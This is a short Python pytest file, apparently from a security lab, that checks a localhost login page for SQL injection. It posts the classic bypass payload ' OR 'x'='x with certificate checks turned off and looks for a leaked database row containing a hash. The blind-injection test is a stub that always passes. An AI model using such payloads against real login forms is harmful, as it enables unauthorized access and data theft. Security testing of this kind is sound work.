import sys, requests, pytest

def testClassic():
    s = requests.Session()
    r = s.post("https://localhost/login", data={'username' : "' OR 'x'='x", 'password': 'password'}, verify=False)
    s.close()
    if b"('pL41qCFwnagJcZsM', '8c0f5ab2947a5a03c5275599e8b1cff2f7f281d07702a4082fcafa239b621ad8', 'chaim')" in r.content:
        return True
    return False

def testBlind():
    return True

def testSQLInjection():
    assert testClassic() and testBlind() == True